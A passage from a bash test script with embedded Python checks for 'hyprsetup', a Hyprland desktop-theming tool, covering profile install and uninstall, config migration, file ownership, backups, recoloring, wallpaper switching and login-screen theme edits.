        if "config ok" not in (out.stdout + out.stderr).lower():
            problems.append("converted config is invalid in Hyprland: "
                            + (out.stdout + out.stderr)[-300:])

with tempfile.TemporaryDirectory() as t:
    t = Path(t); up = t / "upstream"; home = t / "home"; root = t / "root"
    (up / "hypr").mkdir(parents=True); (up / "waybar").mkdir()
    (up / "hypr/hyprland.conf").write_text(old)
    (up / "waybar/config").write_text("{}")
    git = lambda *a: subprocess.run(["git", "-C", str(up), *a], check=True,
                                    capture_output=True)
    git("init", "-q"); git("add", ".")
    git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "x")
    commit = subprocess.run(["git", "-C", str(up), "rev-parse", "HEAD"],
                            capture_output=True, text=True).stdout.strip()
    (root / "presets/profile").mkdir(parents=True)
    (root / "wallpapers").mkdir()
    (root / "wallpapers/w.png").write_bytes(b"png")
    (root / "presets/profile/demo.rice.toml").write_text(f"""
default_variant = "a"
[source]
repo = "{up}"
commit = "{commit}"
[[install]]
from = "hypr"
to = "~/.config/hypr"
[[install]]
from = "waybar"
to = "~/.config/waybar"
[variants.a]
title = "A"
wallpaper = "wallpapers/w.png"
wallpaper_dest = "~/Pictures/w.png"
apply = ["echo {{wallpaper}}"]
""")
    (home / ".config/hypr").mkdir(parents=True)
    (home / ".config/hypr/hyprland.conf").write_text("old")
    nwg = "# Generated by nwg-displays on 2026-09-25 at 18:03:35. Do not edit manually.\n"
    (home / ".config/hypr/monitors.conf").write_text(nwg + "monitor=DP-1,1920x1080@60.0,0x0,1\n")
    (home / ".config/foot").mkdir(parents=True)
    (home / ".config/foot/foot.ini").write_text("user foot\n")
    res = rice.install(root, "demo", home=home, run_commands=False)
    # The author's scripts rewrite shared theme files at run time (vantage:
    # foot.ini) or create them (end4: gtk.css); uninstall must undo both.
    (home / ".config/foot/foot.ini").write_text("rice colors\n")
    (home / ".config/gtk-3.0").mkdir(parents=True, exist_ok=True)
    (home / ".config/gtk-3.0/gtk.css").write_text("rice css\n")
    # The nwg-displays layout must also be loaded in a profile and kept on uninstall.
    if "monitor=DP-1" not in (home / ".config/hypr/monitors.conf").read_text() or \
            "source = ~/.config/hypr/monitors.conf" not in \
            (home / ".config/hypr/hyprland.conf").read_text().rsplit("hyprsetup-keybinds", 1)[-1]:
        problems.append("nwg-displays layout was not carried into the profile")
    (home / ".config/hypr/monitors.conf").write_text(nwg + "monitor=DP-1,1920x1080@144.0,0x0,1\n")
    conf = (home / ".config/hypr/hyprland.conf").read_text()
    if "windowrulev2" in conf or "match:class" not in conf:
        problems.append("Hyprland config was not converted during install")
    if not (home / "Pictures/w.png").is_file():
        problems.append("variant wallpaper was not placed")
    owned = rice.owned_paths(home)
    if not rice.is_owned(home / ".config/waybar/style.css", owned) or \
            rice.is_owned(home / ".config/kitty/kitty.conf", owned):
        problems.append(f"wrong ownership: {owned}")
    # Live apply (apply.py) must not write to an owned path.
    from hyprsetup.apply import Applier
    from hyprsetup.catalog import Catalog
    stage = t / "stage"; (stage / "hypr").mkdir(parents=True); (stage / "kitty").mkdir()
    (stage / "hypr/hyprland.conf").write_text("TEMPLATE"); (stage / "kitty/kitty.conf").write_text("k")
    app = Applier(Path("."), Catalog.load("config/components.json"),
                  config_home=home / ".config")
    written = app.write_changed(stage)
    if "hypr/hyprland.conf" in written or \
            "TEMPLATE" in (home / ".config/hypr/hyprland.conf").read_text():
        problems.append("live apply overwrote the profile's file")
    if "kitty/kitty.conf" not in written:
        problems.append("live apply also skipped an unowned file")
    # KDE files: KConfig strips comments, sorts keys and adds its own key. If
    # the settings are the same it must not be rewritten; when a value changes
    # it must be written.
    kstage = t / "kstage"; kstage.mkdir()
    (kstage / "dolphinrc").write_text("# comment\n[General]\nB=1\nA=2\n\n[Search]\nLocation=Everywhere\n")
    app.write_changed(kstage)
    (home / ".config/dolphinrc").write_text(
        "[General]\nA=2\nB=1\nVersion=202\n\n[Search]\nLocation=Everywhere\n")
    if "dolphinrc" in app.write_changed(kstage):
        problems.append("dolphinrc reformatted by KDE is rewritten on every apply")
    (home / ".config/dolphinrc").write_text("[General]\nA=9\nB=1\n\n[Search]\nLocation=Everywhere\n")
    if "dolphinrc" not in app.write_changed(kstage):
        problems.append("changed value in dolphinrc was not corrected")
    rice.uninstall(home=home)
    if (home / ".config/hypr/hyprland.conf").read_text() != "old":
        problems.append("uninstall did not restore the old hyprland.conf")
    if "@144.0" not in (home / ".config/hypr/monitors.conf").read_text():
        problems.append("change made in nwg-displays during install was lost on uninstall")
    if (home / ".config/waybar").exists() or rice.read_state(home):
        problems.append("uninstall did not clean up the author's files/state")
    if (home / ".config/foot/foot.ini").read_text() != "user foot\n" or \
            (home / ".config/gtk-3.0/gtk.css").exists():
        problems.append("shared theme files changed by the rice were not restored")
    if not any(p.read_text() == "rice colors\n"
               for p in (home / ".config/hyprsetup-backups").rglob("_shared-rice/.config/foot/foot.ini")):
        problems.append("the rice-time foot.ini was not kept in the backup")
    # Install at session start: look commands run not during install but in
    # start_session, after the wallpaper daemon is up.
    res = rice.install(root, "demo", home=home, start_later=True)
    if res.session != [f"echo {home / 'Pictures/w.png'}"]:
        problems.append(f"start_later did not defer the look commands: {res.session}")
    rice.uninstall(home=home)

# Rules added to the converter later (all verified in Hyprland).
more = """bind = SUPER, J, togglesplit
blurls = waybar
windowrule = rounding 10, title:, class:steam
windowrulev2 = float, title:^(Open File|Save, As)$
windowrulev2 = opaque, class:mpv
misc {
    new_window_takes_over_fullscreen = 2
}
windowrule {
    match:class = foot
    no_border = on
}
"""
new2, _r = hyprmigrate.migrate(more)
for want in ("bind = SUPER, J, layoutmsg, togglesplit",
             "layerrule = blur on, match:namespace waybar",
             "match:title ^$", "match:title ^(Open File|Save\\x2c As)$",
             "windowrule = opaque on, match:class mpv",
             "on_focus_under_fullscreen = 2",
             "name = hyprsetup-windowrule-1", "border_size = 0"):
    if want not in new2:
        problems.append(f"hyprmigrate (extra rules): '{want}' missing")
if _hypr_verify_conf:
    with tempfile.TemporaryDirectory() as t:
        conf = Path(t) / "h.conf"; conf.write_text(new2)
        out = subprocess.run(["Hyprland", "--verify-config", "-c", str(conf)],
                             capture_output=True, text=True, timeout=60,
                             env={**{k: v for k, v in os.environ.items()
                                     if k not in rice._SESSION_VARS},
                                  "HOME": t, "XDG_RUNTIME_DIR": t})
        if "config ok" not in (out.stdout + out.stderr).lower():
            problems.append("extra rules invalid in Hyprland: "
                            + (out.stdout + out.stderr)[-300:])

# hyprpaper 0.8: no "preload", "wallpaper = monitor, path" → wallpaper { } block.
hp, _r = hyprmigrate.migrate_hyprpaper(
    "preload = ~/a.png\nwallpaper = , ~/a.png\nwallpaper = DP-1,contain:~/b.png\nsplash = false\n")
for want in ("wallpaper {", "    monitor = DP-1", "    path = ~/b.png",
             "    fit_mode = contain", "splash = false"):
    if want not in hp:
        problems.append(f"hyprpaper conversion: '{want}' missing")
if any(l.startswith(("preload", "wallpaper =")) for l in hp.splitlines()):
    problems.append("hyprpaper conversion: an old line remained")

# Look commands: only {wallpaper} is filled in; the shell's own braces
# (find -exec {} +) stay intact, and a command is skipped if there is no wallpaper.
ran = rice._run(["find . -exec chmod +x {} +", "swww img {wallpaper}"],
                Path("/nonexistent"), {}, execute=False)
if ran != ["find . -exec chmod +x {} +"]:
    problems.append(f"_run placeholders: {ran}")

# An unknown/misplaced key (e.g. post_install written after [packages] lands
# in that table) must not be silently ignored.
with tempfile.TemporaryDirectory() as t:
    r = Path(t); (r / "presets/profile").mkdir(parents=True)
    (r / "presets/profile/x.rice.toml").write_text(
        '[source]\nrepo = "r"\ncommit = "c"\n[packages]\nrepo = []\npost_install = ["a"]\n')
    try:
        rice.load(r, "x")
        problems.append("misplaced key in manifest was accepted")
    except ValueError:
        pass

# Extra repo, fix for an overlapping item, ownership in merge mode, script file,
# GPU-conditional fix, wallpaper from inside a zip.
with tempfile.TemporaryDirectory() as t:
    t = Path(t); home = t / "home"; root = t / "root"
    def mkrepo(path, files):
        path.mkdir(parents=True)
        for name, text in files.items():
            (path / name).parent.mkdir(parents=True, exist_ok=True)
            (path / name).write_text(text)
        g = lambda *a: subprocess.run(["git", "-C", str(path), *a], check=True,
                                      capture_output=True)
        g("init", "-q"); g("add", ".")
        g("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "x")
        return subprocess.run(["git", "-C", str(path), "rev-parse", "HEAD"],
                              capture_output=True, text=True).stdout.strip()
    c1 = mkrepo(t / "main", {"hypr/hyprland.conf": "general {\n    gaps_in = 3\n}\n",
                             "hypr/launcher.qml": "OLD", "icons/app.svg": "svg",
                             "hypr/env.conf": "env = GBM_BACKEND,nvidia-drm\n"})
    c2 = mkrepo(t / "extra", {"launcher.qml": "path: /home/author/moon.jpg"})
    import zipfile
    with zipfile.ZipFile(t / "w.zip", "w") as z:
        z.writestr("violet.jpg", "JPG")
    (root / "presets/profile").mkdir(parents=True)
    (root / "presets/profile/x.conf").write_text("THEME=auto\n")
    (root / "presets/profile/x.rice.toml").write_text(f"""
default_variant = "v"
[source]
repo = "{t / 'main'}"
commit = "{c1}"
[[install]]
from = "hypr"
to = "~/.config/hypr"
[[install]]
from = "launcher.qml"
to = "~/.config/hypr/launcher.qml"
repo = "{t / 'extra'}"
commit = "{c2}"
[[install]]
from = "icons"
to = "~/.local/share/icons"
mode = "merge"
[[file]]
to = "~/.local/bin/helper"
content = "#!/bin/sh\\necho x\\n"
[[fix]]
file = "~/.config/hypr/launcher.qml"
replace = ["/home/author", "{{home}}"]
[[fix]]
file = "~/.config/hypr/env.conf"
replace = ["env = GBM_BACKEND,nvidia-drm", "# env = GBM_BACKEND,nvidia-drm"]
gpu = "no-nvidia"
[variants.v]
wallpaper = "file://{t / 'w.zip'}#violet.jpg"
wallpaper_dest = "~/Pictures/violet.jpg"
""")
    (home / ".local/share/icons").mkdir(parents=True)
    (home / ".local/share/icons/user.svg").write_text("mine")
    os.environ["HYPRSETUP_GPU"] = "other"
    try:
        rice.install(root, "x", home=home, run_commands=False)
    finally:
        os.environ.pop("HYPRSETUP_GPU", None)
    launcher = (home / ".config/hypr/launcher.qml").read_text()
    if launcher != f"path: {home}/moon.jpg":
        problems.append(f"extra repo item/fix wrong: {launcher!r}")
    if not (home / ".config/hypr/env.conf").read_text().startswith("# env"):
        problems.append("GPU-conditional fix not applied on a non-NVIDIA machine")
    if not os.access(home / ".local/bin/helper", os.X_OK):
        problems.append("[[file]] starting with #! is not executable")
    if (home / "Pictures/violet.jpg").read_text() != "JPG":
        problems.append("wallpaper was not extracted from the zip")
    rice.uninstall(home=home)
    if (home / ".local/share/icons/user.svg").read_text() != "mine" \
            or (home / ".local/share/icons/app.svg").exists():
        problems.append("merge mode: uninstall touched the user's file "
                        "or left the author's behind")

# Manifests in the repo: must be readable, targets must be in the home directory,
# local wallpapers must exist, repo packages must be found in pacman.
have_pacman = shutil.which("pacman") and subprocess.run(
    ["pacman", "-Si", "pacman"], capture_output=True).returncode == 0
for path in sorted(P.default_dir(Path("."), "profile").glob("*" + rice.SUFFIX)):
    name = path.name[: -len(rice.SUFFIX)]
    try:
        m = rice.load(Path("."), name)
    except Exception as exc:                       # noqa: BLE001
        problems.append(f"{name}: manifest could not be read: {exc}"); continue
    if not (Path("presets/profile") / f"{name}.conf").is_file():
        problems.append(f"{name}: {name}.conf missing for the gallery card")
    for commit in {m.commit, *(i.commit for i in m.installs if i.commit)}:
        if len(commit) != 40 or any(c not in "0123456789abcdef" for c in commit):
            problems.append(f"{name}: commit is not a full SHA: {commit}")
    for item in m.installs:
        if not item.dest.startswith("~/"):
            problems.append(f"{name}: target outside the home directory: {item.dest}")
        if item.repo and not item.commit:
            problems.append(f"{name}: no commit for extra repo ({item.repo})")
    for v in m.variants.values():
        # Those under /usr/share come from a package (athena: archlinux-wallpaper);
        # if the package is not installed, their absence on the test machine is not an error.
        if (v.wallpaper and not v.wallpaper.startswith(("http", "~/", "/usr/share/"))
                and not Path(v.wallpaper).is_file()):
            problems.append(f"{name}/{v.name}: wallpaper missing: {v.wallpaper}")
    if m.default_variant and m.default_variant not in m.variants:
        problems.append(f"{name}: default variant undefined")
    if have_pacman:
        bad = [p for p in m.packages_repo
               if subprocess.run(["pacman", "-Si", p], capture_output=True).returncode]
        if bad:
            problems.append(f"{name}: package not in repos: {bad}")
print("\n".join(problems))
RICEEOF
)
    if [[ -n "$rice_out" ]]; then
        fail "profiles (migration, install, ownership, uninstall, manifests)" "$rice_out"$'\n'
    else
        pass "profiles (migration, install, ownership, uninstall, manifests)"
    fi

    # Mix (mix.py): picking pieces from profiles. The readers must flatten the
    # author's Hyprland files correctly, a custom animation set must be
    # reproduced exactly, and parts must be installable and revertible from backup.
    mix_out=$(PYTHONPATH=python python3 - <<'MIXEOF'
import json, os, tempfile
from pathlib import Path
from hyprsetup import mix, rice, render, themes
problems = []
root = Path(".")

with tempfile.TemporaryDirectory() as tmp:
    home = Path(tmp)
    hypr = home / ".config/hypr"
    (hypr / "parts").mkdir(parents=True)
    (hypr / "hyprland.conf").write_text(
        "$r = 12\nsource = ~/.config/hypr/parts/*.conf\n"
        "decoration {\n    rounding = $r\n    blur {\n        size = 3 # comment\n    }\n}\n")
    (hypr / "parts/a.conf").write_text(
        "general {\n    gaps_in = 4\n    gaps_out = 6,10,10,10\n}\n"
        "animations {\n    enabled = yes\n    bezier = b, 0.2, 1, 0.3, 1\n"
        "    animation = windows, 1, 3.5, b, popin 80%\n    animation = fade, 0\n}\n")
    values, anim = mix.parse_hyprlang(hypr / "hyprland.conf", home)
    look = mix.look_settings(values, anim)
    want = {"ROUNDING": "12", "BLUR_SIZE": "3", "GAPS_IN": "4", "GAPS_OUT": "6",
            "ANIMATIONS": "true", "BORDER_SIZE": "1", "ANIMATION_PRESET": "custom"}
    for key, value in want.items():
        if look.get(key) != value:
            problems.append(f"hyprlang reader: {key}={look.get(key)!r}, expected {value!r}")
    if anim != ["bezier = b, 0.2, 1, 0.3, 1", "animation = windows, 1, 3.5, b, popin 80%",
                "animation = fade, 0"]:
        problems.append(f"wrong animation lines: {anim}")

    lua = home / "lua"
    lua.mkdir()
    (lua / "hyprland.lua").write_text(
        'hl.config({ general = { gaps_in = 7, col = { active_border = RED } },\n'
        '  decoration = { rounding = 18, shadow = { enabled = false } } })\n'
        '-- comment: rounding = 99\n'
        'hl.curve("n", { type = "bezier", points = { {0.16, 1.0}, {0.30, 1.0} } })\n'
        'hl.animation({ leaf = "global", enabled = true, speed = 3.5, bezier = "n" })\n')
    lvalues, lanim = mix.parse_lua(lua)
    if (lvalues.get("general:gaps_in"), lvalues.get("decoration:rounding"),
            lvalues.get("decoration:shadow:enabled")) != ("7", "18", "false"):
        problems.append(f"Lua reader: {lvalues}")
    if lanim != ["bezier = n, 0.16, 1.0, 0.30, 1.0", "animation = global, 1, 3.5, n"]:
        problems.append(f"Lua animations: {lanim}")

# Custom animation set: the author's order and fractional durations are kept.
v = {"ANIMATION_PRESET": "custom", "ANIMATION_SPEED": "2",
     "ANIMATION_CUSTOM": "bezier = n, 0.1, 1, 0.3, 1;;animation = global, 1, 3.5, n"
                         ";;animation = fade, 0"}
conf = render._animation_lines(v)
if conf[-2:] != ["    animation = global, 1, 1.75, n", "    animation = fade, 0"]:
    problems.append(f"custom animation (conf): {conf}")
if 'hl.animation({ leaf = "fade", enabled = false })' not in render._animation_lines(v, "lua"):
    problems.append("custom animation (lua): disabled branch missing")
if render._animation_lines({"ANIMATION_PRESET": "custom"}) != []:
    problems.append("empty custom set does not defer to Hyprland defaults")

# Recoloring: neutral → neutral, colored → colored, opacity preserved.
rc = mix.Recolor(themes.resolve("catppuccin-mocha"), themes.resolve("gruvbox-dark"))
out = rc.text("a: #1e1e2e; b: #89b4facc; c: rgba(137, 180, 250, 0.5); d: rgba(cdd6f4ff); #clock {}")
if out != "a: #282828; b: #83a598cc; c: rgba(131, 165, 152, 0.5); d: rgba(ebdbb2ff); #clock {}":
    problems.append(f"recolor: {out}")
if rc.text('c: "#cc89b4fa"', argb=True) != 'c: "#cc83a598"':
    problems.append("QML #AARRGGBB converted incorrectly")

# Catalog: every profile, variant and part is consistent.
parts = mix.load_parts(root)
manifests = sorted(p.name[: -len(rice.SUFFIX)]
                   for p in Path("presets/profile").glob("*" + rice.SUFFIX))
missing = set(manifests) - set(parts["profiles"])
if missing:
    problems.append(f"profiles missing from parts.json (mix scan): {sorted(missing)}")
for name, entry in parts["profiles"].items():
    if entry.get("own"):
        # Our own profiles: built from presets/profile, no rice manifest.
        for variant, info in entry["variants"].items():
            if info.get("wallpaper") and not info.get("wpengine") and not mix.thumbnail_path(root, name, variant).is_file():
                problems.append(f"{name}: own part photo missing")
            if info.get("colors") and not mix.palette_of(parts, f"{name}/{variant}"):
                problems.append(f"{name}: own part palette does not resolve")
        if not all(k in entry["look"]["values"] for k in mix.LOOK_DEFAULTS):
            problems.append(f"{name}: own part look incomplete")
        continue
    m = rice.load(root, name)
    for variant, info in entry["variants"].items():
        if variant not in m.variants:
            problems.append(f"{name}/{variant}: no such variant in the profile")
        if info.get("wallpaper") and not mix.thumbnail_path(root, name, variant).is_file():
            problems.append(f"{name}/{variant}: preview missing")
    look = (entry.get("look") or {}).get("values", {})
    for key in ("GAPS_IN", "ROUNDING", "BLUR"):
        if entry.get("look") and key not in look:
            problems.append(f"{name}: {key} missing from look")
all_refs = {r for items in mix.app_parts(root).values() for r, _p in items}
for slot, items in mix.app_parts(root).items():
    if slot not in mix.APP_SLOT_IDS:
        problems.append(f"unknown part slot: {slot}")
    for ref, part in items:
        for path in (*part.paths, *part.needs, *(f.partition(':')[2] for f in part.palette_files)):
            if not path.startswith("~/"):
                problems.append(f"{ref}: path outside the home directory: {path}")
        for need in part.requires:
            if need not in all_refs:
                problems.append(f"{ref}: required part missing: {need}")
        if part.entry and not part.modules:
            problems.append(f"{ref}: shell section component list is empty")

# Install → uninstall: the user's file must come back from backup byte for byte.
if rice.vendor_archive(rice.vendor_dir(root), "https://github.com/ad1822/hyprdots",
                       rice.load(root, "ad1822").commit):
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        (home / ".config/dunst").mkdir(parents=True)
        (home / ".config/dunst/dunstrc").write_text("mine")
        values = {"THEME": "gruvbox-dark", "CUSTOM_COLORS": "", "WALLPAPER_PATH": ""}
        # A part whose program is missing does not take over its role; fake
        # dunst and kitty so the result does not depend on this machine.
        fakebin = home / "fakebin"
        fakebin.mkdir()
        for prog in ("dunst", "kitty"):
            (fakebin / prog).write_text("#!/bin/sh\n")
            (fakebin / prog).chmod(0o755)
        old_path = os.environ.get("PATH", "")
        os.environ["PATH"] = f"{fakebin}:{old_path}"
        try:
            mix.install_parts(root, {"notify": "ad1822/notify", "terminal": "ad1822/terminal"},
                              values, home=home, log=lambda *_: None)
        finally:
            os.environ["PATH"] = old_path
        state = mix.read_state(home)["installed"]
        text = (home / ".config/dunst/dunstrc").read_text()
        if text == "mine" or "#1e1e2e" in text.lower():
            problems.append("part not installed or not recolored (dunst)")
        if state.get("provides") != ["notify"] or state["commands"].get("CMD_TERMINAL") != "kitty":
            problems.append(f"wrong part state: {state}")
        if mix.render_vars(home).get("MIX_OVERRIDE_CMD_TERMINAL") != "kitty":
            problems.append("keybinding command does not reach the templates")
        if Path(home / ".config/dunst") not in rice.owned_paths(home):
            problems.append("part paths are not owned (the settings engine would overwrite them)")
        mix.remove_parts(home)
        if (home / ".config/dunst/dunstrc").read_text() != "mine" \
                or (home / ".config/kitty").exists() or (home / ".config/hypr/mix.conf").exists():
            problems.append("removing parts did not restore the old state")

# Fill slot → clear: settings return to their previous values (including VIS_ENABLE & WPENGINE_ID).
with tempfile.TemporaryDirectory() as tmp:
    home = Path(tmp)
    current = {"GAPS_IN": "9", "ROUNDING": "3", "ANIMATION_PRESET": "fluid",
               "THEME": "tokyo-night", "CUSTOM_COLORS": "", "VIS_ENABLE": "true",
               "WALLPAPER_DAEMON": "hyprpaper", "WPENGINE_ID": ""}
    changes, state = mix.plan(root, {"look": "nothingos", "colors": "r4ppz19/kiz",
                                     "wallpaper": "st-kule/own"},
                              current, home=home)
    if changes.get("ROUNDING") != "18" or changes.get("THEME") != "gruvbox-dark":
        problems.append(f"wrong slot values: {changes}")
    if changes.get("VIS_ENABLE") != "false":
        problems.append(f"mixing look did not turn off VIS_ENABLE: {changes.get('VIS_ENABLE')!r}")
    if (changes.get("WALLPAPER_DAEMON"), changes.get("WPENGINE_ID")) != ("wallpaperengine", "2579315681"):
        problems.append(f"st-kule wallpaper did not select Wallpaper Engine: {changes}")
    mix.write_state(state, home)
    current.update(changes)
    back, state = mix.plan(root, {"look": "", "colors": "", "wallpaper": ""}, current, home=home)
    if (back.get("GAPS_IN"), back.get("ROUNDING"), back.get("ANIMATION_PRESET"),
            back.get("THEME"), back.get("VIS_ENABLE"), back.get("WALLPAPER_DAEMON"),
            back.get("WPENGINE_ID")) != ("9", "3", "fluid", "tokyo-night", "true", "hyprpaper", ""):
        problems.append(f"clearing the slot did not restore the old values: {back}")

# Switching from hyprpaper to st-gozcu / st-kule on the FIRST apply after startup
# must still trigger the wallpaper action even if wallpaperengine.sh on disk is
# already identical (seed_state).
with tempfile.TemporaryDirectory() as tmp:
    from hyprsetup import apply as apply_mod, catalog as cat_mod
    from hyprsetup.gui import state as state_mod
    cat = cat_mod.Catalog.load(root / "config/components.json")
    cfg = Path(tmp) / ".config"
    # Pre-seed wallpaperengine.sh on disk with st-gozcu's scene ID.
    st_pre = state_mod.SetupState(cat)
    st_pre.apply_profile_preset(root, "st-gozcu")
    st_pre.sync_profile_components(root, "st-gozcu")
    ap_pre = apply_mod.Applier(root, cat, config_home=cfg)
    ap_pre.apply(st_pre.values, sorted(st_pre.selected))
    # Fresh Applier seeded with a hyprpaper profile (simulates reopening the GUI).
    st_run = state_mod.SetupState(cat)
    st_run.apply_profile_preset(root, "st-crt")
    st_run.sync_profile_components(root, "st-crt")
    ap_fresh = apply_mod.Applier(root, cat, config_home=cfg)
    ap_fresh.seed_state(st_run.values, sorted(st_run.selected))
    st_run.apply_profile_preset(root, "st-gozcu")
    st_run.sync_profile_components(root, "st-gozcu")
    res_gozcu = ap_fresh.apply(st_run.values, sorted(st_run.selected))
    if "Wallpaper daemon restarted" not in res_gozcu.actions:
        problems.append(f"first apply to st-gozcu did not restart wallpaper: {res_gozcu.actions}")
    st_run.apply_profile_preset(root, "st-kule")
    st_run.sync_profile_components(root, "st-kule")
    res_kule = ap_fresh.apply(st_run.values, sorted(st_run.selected))
    if "Wallpaper daemon restarted" not in res_kule.actions:
        problems.append(f"switch to st-kule did not restart wallpaper: {res_kule.actions}")

# Applying a profile after Soup Maker must use the profile image, even when
# both the previous mix image and the default wallpaper are user files.
with tempfile.TemporaryDirectory() as tmp:
    from unittest.mock import patch

    home = Path(tmp)
    cfg = home / ".config"
    wallpapers = home / "Pictures/wallpapers"
    wallpapers.mkdir(parents=True)
    mix_image = wallpapers / "mix-st-kule-own.png"
    mix_image.write_bytes(b"saved Soup Maker wallpaper")
    custom_image = wallpapers / "wallpaper.png"
    custom_image.write_bytes(b"custom wallpaper")
    st = state_mod.SetupState(cat)
    st.values["WALLPAPER_PATH"] = f"~/Pictures/wallpapers/{mix_image.name}"
    ap = apply_mod.Applier(root, cat, config_home=cfg)
    ap.component_installed = lambda *_: True
    ap.seed_state(st.values, st.selected)
    for name in ("st-yaprak", "st-orman"):
        st.apply_profile_preset(root, name, "photo")
        result = ap.apply(st.values, st.selected)
        target = ap.wallpaper_file(st.values)
        source = root / st.get("WALLPAPER_IMAGE")
        if not target.is_file() or target.read_bytes() != source.read_bytes():
            problems.append(f"switch to {name} did not copy the profile wallpaper")
        if "Wallpaper daemon restarted" not in result.actions:
            problems.append(f"switch to {name} did not refresh the wallpaper daemon")
    if (mix_image.read_bytes() != b"saved Soup Maker wallpaper"
            or custom_image.read_bytes() != b"custom wallpaper"):
        problems.append("switching profiles overwrote another wallpaper")

    # awww must be sent the image explicitly, including when the profile file
    # is already current and the only change is which path to display.
    st.toggle("swww", True)
    ap.seed_state(dict(st.values, WALLPAPER_PATH=str(mix_image)), st.selected)
    result = ap.apply(st.values, st.selected)
    wallpaper_script = cfg / "hypr/scripts/wallpaper.sh"
    with (patch.object(apply_mod, "_process_running", return_value=False),
          patch.object(apply_mod, "_run", return_value=True) as run):
        ap._refresh_wallpaper(dict(st.values, WALLPAPER_DAEMON="swww"))
    if ("Wallpaper daemon restarted" not in result.actions
            or run.call_count != 1
            or run.call_args.args != ([str(wallpaper_script), "set", str(target)],)):
        problems.append("switching profiles did not send the selected image to awww")
# The profile overlay must carry this project's window rules: otherwise
# under the author's hypr config ALT+Tab becomes a tiled window.
from hyprsetup import keybinds as K
tmpl = Path("templates/hypr/windowrules.conf.tmpl").read_text().replace(
    "{{SWITCHER_ANIM_RULE}}", "no_anim on")
rules = K.app_window_rules(tmpl)
if not any("Switcher" in r and "float on" in r for r in rules):
    problems.append("overlay: ALT+Tab floating window rule missing")
for lang, want in (("conf", "windowrule = float on"), ("lua", "hl.window_rule(")):
    layer = K.rice_overlay("bind = SUPER, Q, killactive,", lang,
                           window_rules=rules if lang == "conf" else K.window_rules_to_lua(rules))
    if want not in layer or "Switcher" not in layer:
        problems.append(f"overlay ({lang}): window rules not written")
print("\n".join(problems))
MIXEOF
)
    if [[ -n "$mix_out" ]]; then
        fail "mix (readers, animation, recolor, parts, revert)" "$mix_out"$'\n'
    else
        pass "mix (readers, animation, recolor, parts, revert)"
    fi

    # Login screen (login.py): with fake theme dirs, no root. SDDM edits must go
    # to <ConfigFile>.user, not the theme's own file; images must be copied into
    # the theme dir and turned into relative names (the greeter cannot read the
    # home directory); Plasma Login's other groups must be preserved.
    login_out=$(PYTHONPATH=python python3 - <<'LOGINEOF'
import tempfile
from pathlib import Path
from hyprsetup import login, themes

problems = []
root = Path(".")
catalog = login.load_catalog(root)
ids = [c.id for c in catalog]
if len(ids) != len(set(ids)) or len(ids) < 5:
    problems.append(f"catalog: {ids}")
for entry in catalog:
    if not login.preview_image(root, entry.id):
        problems.append(f"preview image missing: {entry.id}")
    bad = [r for r in entry.palette.values() if r not in login.ROLES]
    if bad:
        problems.append(f"{entry.id}: unknown palette role {bad}")

tmp = Path(tempfile.mkdtemp())
base = tmp / "themes"
astro = base / "sddm-astronaut-theme"
(astro / "Themes").mkdir(parents=True)
(astro / "metadata.desktop").write_text(
    "[SddmGreeterTheme]\nName=Astro\nConfigFile=Themes/astronaut.conf\nQtVersion=6\n")
(astro / "Themes/astronaut.conf").write_text(
    '[General]\nBackground="Backgrounds/a.png"\nHeaderTextColor="#ffffff"\nPartialBlur="true"\nFontSize="13"\n')
(astro / "Themes/cyberpunk.conf").write_text('[General]\nFont="Orbitron"\nHeaderTextColor="#ff00ff"\n')
image = tmp / "wall.jpg"
image.write_bytes(b"x")

theme = login.find_theme(root, "sddm-astronaut-theme", base)
if theme is None or theme.catalog is None or theme.catalog.id != "astronaut":
    problems.append("installed theme did not match the catalog")
else:
    if [p for _l, p in theme.presets()] != ["Themes/astronaut.conf", "Themes/cyberpunk.conf"]:
        problems.append(f"theme presets: {theme.presets()}")
    kinds = {f.key: f.type for f in login.fields(theme, "Themes/cyberpunk.conf")}
    want = {"General/Background": "image", "General/HeaderTextColor": "color",
            "General/PartialBlur": "bool", "General/FontSize": "int", "General/Font": "text"}
    if any(kinds.get(k) != v for k, v in want.items()):
        problems.append(f"field types: {kinds}")
    edits = {**login.palette_edits(theme, themes.derive(themes.DEFAULT)),
             **login.background_edits(theme, image)}
    staged = login.stage(theme, "Themes/cyberpunk.conf", edits, tmp / "stage")
    rels = [rel for _s, rel in staged]
    if rels != ["Backgrounds/hyprsetup-background.jpg", "Themes/astronaut.conf.user"]:
        problems.append(f"staged files: {rels}")
    user = login.read_ini(tmp / "stage/Themes/astronaut.conf.user")
    if user.get("General/Background") != "Backgrounds/hyprsetup-background.jpg":
        problems.append(f".user background: {user.get('General/Background')}")
    if user.get("General/Font") != "Orbitron":
        problems.append(".user does not carry the theme preset")
    if not user.get("General/HeaderTextColor", "").startswith("#") or \
            user["General/HeaderTextColor"] == "#ff00ff":
        problems.append("palette colors were not written to .user")
    if (astro / "Themes/astronaut.conf").read_text().count("Orbitron"):
        problems.append("the theme's own file changed")

# Plasma Login: Autologin and the other Greeter keys are preserved.
conf = tmp / "plasmalogin.conf"
conf.write_text("[Autologin]\nSession=plasma\n\n[Greeter]\nPreselectedUser=me\nShowClock=true\n")
text = login.plasmalogin_conf_text(login.PlasmaLogin(show_clock=False, wallpaper="color",
                                                     color="#102030"), path=conf)
for want in ("[Autologin]\nSession=plasma", "PreselectedUser=me", "ShowClock=false",
             "WallpaperPluginId=org.kde.color", "Color=16,32,48"):
    if want not in text:
        problems.append(f"plasmalogin.conf: '{want}' missing")
if text.count("ShowClock") != 1:
    problems.append("plasmalogin.conf: ShowClock twice")
print("\n".join(problems))
LOGINEOF
)
    # Wallpaper colors (wallcolors.py): ricemood tags and pywal templates must
    # fill in correctly, bundled templates must be written to their targets and
    # add the include line once, and the user file's original state must be kept.
    wallcolors_out=$(PYTHONPATH=python python3 - <<'WCEOF'
import json, os, tempfile
from pathlib import Path

tmp = Path(tempfile.mkdtemp())
os.environ["XDG_CONFIG_HOME"] = str(tmp / "config")
os.environ["XDG_CACHE_HOME"] = str(tmp / "cache")
os.environ["HOME"] = str(tmp / "home")
from hyprsetup import wallcolors as W, themes

problems = []
roles = {k: v.lstrip("#").upper() for k, v in themes.THEMES[themes.DEFAULT].items()
         if k in themes.KEYS}
colors = W.Colors(image="/x.png", vibrant={"Vibrant": "FF0000", "DarkMuted": "203040"},
                  roles=roles)
cases = {
    "^r@Vibrant^": "#FF0000",
